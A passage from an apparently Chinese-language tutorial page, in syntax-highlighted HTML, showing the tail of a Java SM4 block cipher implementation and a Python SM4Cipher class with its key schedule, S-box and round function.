punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span>                <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x48</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token function">splitInt</span><span class="token punctuation">(</span>box_input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//拆分32比特数</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//单个盒变换输出</span>        <span class="token comment">//盒变换</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token constant">SBOX</span><span class="token punctuation">[</span>temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//将4个8位字节合并为一个字作为盒变换输出</span>        <span class="token keyword">return</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span>output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 将input左移n位 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">shift</span><span class="token punctuation">(</span><span class="token keyword">int</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>input <span class="token operator">>>></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>input <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码实现python版"><a class="markdownIt-Anchor" href="#代码实现python版"></a> <strong>代码实现(Python版)</strong></h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SM4Cipher</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"SM4 key must be length of 16. "</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_key_r <span class="token operator">=</span> self<span class="token punctuation">.</span>_generate_key<span class="token punctuation">(</span>key<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>block_size <span class="token operator">=</span> <span class="token number">16</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plaintext<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_do<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_key_r<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ciphertext<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_do<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_key_r<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_do</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> key_r<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text_ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 将 128bit 转化成 4x32bit</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            text_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            box_in <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> text_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> text_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            box_out <span class="token operator">=</span> self<span class="token punctuation">.</span>_s_box<span class="token punctuation">(</span>box_in<span class="token punctuation">)</span>            temp <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_out <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>            temp <span class="token operator">=</span> temp <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span>            text_ <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span>temp<span class="token punctuation">]</span>        text_ <span class="token operator">=</span> text_<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 结果逆序</span>        <span class="token comment"># 将 4x32bit 合并成 128bit</span>        result <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>text_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_generate_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""密钥生成"""</span>        key_r<span class="token punctuation">,</span> key_temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        FK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3b1bac6</span><span class="token punctuation">,</span> <span class="token number">0x56aa3350</span><span class="token punctuation">,</span> <span class="token number">0x677d9197</span><span class="token punctuation">,</span> <span class="token number">0xb27022dc</span><span class="token punctuation">]</span>        CK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00070e15</span><span class="token punctuation">,</span> <span class="token number">0x1c232a31</span><span class="token punctuation">,</span> <span class="token number">0x383f464d</span><span class="token punctuation">,</span> <span class="token number">0x545b6269</span><span class="token punctuation">,</span> <span class="token number">0x70777e85</span><span class="token punctuation">,</span> <span class="token number">0x8c939aa1</span><span class="token punctuation">,</span> <span class="token number">0xa8afb6bd</span><span class="token punctuation">,</span> <span class="token number">0xc4cbd2d9</span><span class="token punctuation">,</span>              <span class="token number">0xe0e7eef5</span><span class="token punctuation">,</span> <span class="token number">0xfc030a11</span><span class="token punctuation">,</span> <span class="token number">0x181f262d</span><span class="token punctuation">,</span> <span class="token number">0x343b4249</span><span class="token punctuation">,</span> <span class="token number">0x50575e65</span><span class="token punctuation">,</span> <span class="token number">0x6c737a81</span><span class="token punctuation">,</span> <span class="token number">0x888f969d</span><span class="token punctuation">,</span> <span class="token number">0xa4abb2b9</span><span class="token punctuation">,</span>              <span class="token number">0xc0c7ced5</span><span class="token punctuation">,</span> <span class="token number">0xdce3eaf1</span><span class="token punctuation">,</span> <span class="token number">0xf8ff060d</span><span class="token punctuation">,</span> <span class="token number">0x141b2229</span><span class="token punctuation">,</span> <span class="token number">0x30373e45</span><span class="token punctuation">,</span> <span class="token number">0x4c535a61</span><span class="token punctuation">,</span> <span class="token number">0x686f767d</span><span class="token punctuation">,</span> <span class="token number">0x848b9299</span><span class="token punctuation">,</span>              <span class="token number">0xa0a7aeb5</span><span class="token punctuation">,</span> <span class="token number">0xbcc3cad1</span><span class="token punctuation">,</span> <span class="token number">0xd8dfe6ed</span><span class="token punctuation">,</span> <span class="token number">0xf4fb0209</span><span class="token punctuation">,</span> <span class="token number">0x10171e25</span><span class="token punctuation">,</span> <span class="token number">0x2c333a41</span><span class="token punctuation">,</span> <span class="token number">0x484f565d</span><span class="token punctuation">,</span> <span class="token number">0x646b7279</span><span class="token punctuation">]</span>        <span class="token comment"># 将 128bit 拆分成 4x32bit</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>            key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> temp <span class="token operator">^</span> FK<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token comment"># 循环生成轮密钥</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            box_in <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> CK<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            box_out <span class="token operator">=</span> self<span class="token punctuation">.</span>_s_box<span class="token punctuation">(</span>box_in<span class="token punctuation">)</span>            key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_out <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_rot_left<span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span>            key_temp <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span>key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> key_r    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">_s_box</span><span class="token punctuation">(</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        BOX <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span>               <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span>               <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span>               <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span>               <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span>               <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span>               <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span>               <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span>               <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span>               <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span>               <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span>               <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>               <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span>               <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span>               <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token 